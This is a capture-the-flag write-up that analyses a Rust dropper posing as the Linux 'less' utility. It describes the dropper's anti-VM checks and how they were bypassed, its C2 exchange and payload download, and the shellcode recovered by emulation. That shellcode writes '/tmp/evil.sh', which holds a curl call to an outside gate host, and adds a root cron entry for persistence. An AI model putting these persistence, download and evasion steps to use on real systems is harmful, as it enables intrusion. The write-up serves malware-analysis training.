# CTF Write-up: Malware Analysis - Dropper and Payload

**Challenge Description:** Our server was hacked. We have found the sample but not the final C2 server.

**Flag Format:** `SK-CERT{}`

## Step 1: Initial Analysis of the Sample
We were given a malicious file masquerading as the Linux `less` utility.
Upon static and dynamic analysis, the `less` file turned out to be an AArch64 statically/dynamically linked Rust binary heavily packed with anti-VM checks. It relies on standard system enumeration tools to detect analysis environments:
- It checks `/proc/self/status` for a `TracerPid`.
- It reads `/proc/self/maps`.
- It executes `systemctl list-units --type=service` to look for VM agents (e.g., `qemu-guest-agent`, `vmware-tools`).
- It executes `lspci` to check for virtualized hardware.

If it detected an analysis environment (such as our QEMU user-mode emulation), it either quietly exited or printed a fake `"Missing filename ("less --help" for help)"` to masquerade as the real `less` utility.

## Step 2: Bypassing the Anti-VM Checks
To bypass the anti-analysis checks, we used a combination of patching the binary and creating a dummy environment.
- We created a fake directory with dummy bash scripts (`lspci`, `systemctl`, `ps`, `lsmod`) and added it to our `PATH` to spoof clean output.
- We patched the AArch64 branch instructions in the binary (`b.ne` and `tbz`) that evaluated the results of the VM checks, ensuring the control flow always took the malicious execution path.

## Step 3: Analyzing the Network Activity
Once the anti-VM checks were successfully bypassed, the malware attempted to establish a connection to its initial C2 server: `exp.cybergame.sk:7060`.
By allowing it to connect to the real server, we observed the following:
1. The server returned a 31-byte string (e.g., `au7Fg8cdLMnoqplhTdveiFFUEtYtt0d`).
2. The malware utilized this string to derive:
    - A 28-byte decryption key.
    - A secondary C2 URL (e.g., `http://212.227.246.142:7050/payload`).
3. The malware then connected to the secondary C2 URL and downloaded an 864-byte file (`payload.bin`).

## Step 4: Extracting the Decrypted Shellcode
After downloading `payload.bin`, the malware decrypted it in memory.
By capturing the `qemu-aarch64` trace during execution, we noticed the malware panicking or failing due to QEMU's limitations with some AArch64 instructions or unmapped executable memory. Before crashing, it leaked the decrypted 864-byte payload (1728 hex characters) to `stderr`.

We extracted this hex dump, converted it back to raw bytes (`sc.bin`), and discovered it was valid AArch64 shellcode rather than an encrypted config file or a string containing the flag.

## Step 5: Emulating the Shellcode
Since the shellcode was crashing under `qemu-user-static` due to environment constraints, we used the **Unicorn** engine (`python3-unicorn`) to emulate its execution in Python. We mapped dummy memory for the code and stack, loaded the shellcode, and hooked the `svc #0` (supervisor call) instruction to intercept its system calls.

During the Unicorn emulation, we observed the following system calls:
1. `openat(..., /tmp/evil.sh)`
2. `write(..., #!/bin/bash\ncurl -s 'http://exp.cybergame.sk/gate?f=SK-CERT{ru57_3x3cu70r_0f_5h1f73d_p4yl04d}')`
3. `openat(..., /mnt/hgfs/shared/../../../etc/cr)`
4. `write(..., \n* * * * * root /bin/bash /tmp/evil.sh\n)`

The shellcode writes a malicious bash script to `/tmp/evil.sh` which contains the final flag, and then attempts to establish persistence via a cronjob.

**Flag:** `SK-CERT{ru57_3x3cu70r_0f_5h1f73d_p4yl04d}`